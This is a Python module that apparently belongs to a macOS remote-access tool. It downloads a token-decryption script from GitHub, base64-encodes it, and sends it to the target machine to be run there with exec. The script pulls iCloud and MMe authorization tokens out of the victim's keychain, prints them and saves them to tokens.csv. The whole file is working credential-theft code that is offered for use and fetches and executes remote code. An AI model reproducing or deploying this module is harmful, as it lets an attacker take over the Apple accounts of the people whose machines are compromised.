import urllib2
import base64


class Module:
    def __init__(self):
        self.info = {
            "Author": ["Marten4n6"],
            "Description": "Retrieves iCloud and MMe authorization tokens.",
            "References": [
                "https://github.com/manwhoami/MMeTokenDecrypt"
            ],
            "Task": False
        }
        self.code = None

    def setup(self, module_view, output_view, successful):
        module_view.add("This will prompt the user to allow keychain access.")
        confirm = module_view.prompt("Are you sure you want to continue? [Y/n]: ").lower()

        if not confirm or confirm == "y":
            request_url = "https://raw.githubusercontent.com/manwhoami/MMeTokenDecrypt/master/MMeDecrypt.py"
            request = urllib2.Request(url=request_url)
            response = "".join(urllib2.urlopen(request).readlines())

            self.code = base64.b64encode(response)
            successful.put(True)
        else:
            output_view.add("Cancelled", "info")
            successful.put(False)

    def run(self):
        return """\
        import csv
        
        tokens_file = get_program_directory() + "/tokens.csv"
        
        if os.path.exists(tokens_file):
            print MESSAGE_INFO + "\\"tokens.csv\\" already exists, skipping prompt..."
            
            with open(tokens_file, "rb") as csv_file:
                reader = csv.reader(csv_file, delimiter=',', quotechar='"')
                
                for row in reader:
                    print ": ".join(row)
        else:
            # Store the results in tokens.csv.
            result = run_command("python -c 'import base64; exec(base64.b64decode(\\"%s\\"))'", False, False)
        
            with open(tokens_file, "wb") as csv_file:
                writer = csv.writer(csv_file, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
            
                for line in result.split("\\n"):
                    if line.startswith("Decrypting token plist"):
                        token_file = line.split("-> ")[1].replace("[", "").replace("]", "")
                        dsid = os.path.basename(token_file)
                        
                        print "DSID: " + dsid
                        writer.writerow(["DSID", dsid])
                    elif "Token" in line and not "not cached" in line:
                        # Remove the useless colors, thanks.
                        line = line.replace("\\033[35m", "").replace("\\033[0m", "")
                    
                        print line
                        writer.writerow([line.split(": ")[0], line.split(": ")[1]])
                print MESSAGE_INFO + "Tokens saved to \\"tokens.csv\\"."
        """ % self.code
